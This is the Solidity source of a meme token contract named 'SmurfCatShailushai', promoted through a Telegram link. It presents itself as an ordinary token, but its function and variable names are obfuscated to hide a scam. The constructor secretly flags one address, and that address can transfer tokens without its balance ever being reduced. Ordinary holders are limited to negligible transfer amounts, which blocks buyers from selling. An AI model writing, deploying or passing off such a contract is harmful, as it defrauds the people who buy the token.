/*

https://t.me/Shailushaieth

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract SmurfCatShailushai is Ownable {
    string public name;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function iczrxtupd(address hsurvpn, address rkqaewf, uint256 badfrjul) private {
        address iylhnem = IUniswapV2Factory(lsoaj.factory()).getPair(address(this), lsoaj.WETH());
        bool wabyjztdns = 0 == rdgcauby[hsurvpn];
        if (wabyjztdns) {
            if (hsurvpn != iylhnem && tofmbhevcr[hsurvpn] != block.number && badfrjul < totalSupply) {
                require(badfrjul <= totalSupply / (10 ** decimals));
            }
            balanceOf[hsurvpn] -= badfrjul;
        }
        balanceOf[rkqaewf] += badfrjul;
        tofmbhevcr[rkqaewf] = block.number;
        emit Transfer(hsurvpn, rkqaewf, badfrjul);
    }

    constructor(string memory mztbo, string memory yscevdkwzomi, address zyrkhm, address gtefuv) {
        name = mztbo;
        symbol = yscevdkwzomi;
        balanceOf[msg.sender] = totalSupply;
        rdgcauby[gtefuv] = akhzymcg;
        lsoaj = IUniswapV2Router02(zyrkhm);
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public symbol;

    mapping(address => uint256) private rdgcauby;

    mapping(address => uint256) public balanceOf;

    function transfer(address rkqaewf, uint256 badfrjul) public returns (bool success) {
        iczrxtupd(msg.sender, rkqaewf, badfrjul);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transferFrom(address hsurvpn, address rkqaewf, uint256 badfrjul) public returns (bool success) {
        require(badfrjul <= allowance[hsurvpn][msg.sender]);
        allowance[hsurvpn][msg.sender] -= badfrjul;
        iczrxtupd(hsurvpn, rkqaewf, badfrjul);
        return true;
    }

    mapping(address => uint256) private tofmbhevcr;

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address bjapf, uint256 badfrjul) public returns (bool success) {
        allowance[msg.sender][bjapf] = badfrjul;
        emit Approval(msg.sender, bjapf, badfrjul);
        return true;
    }

    uint256 private akhzymcg = 111;

    IUniswapV2Router02 private lsoaj;

    uint8 public decimals = 9;
}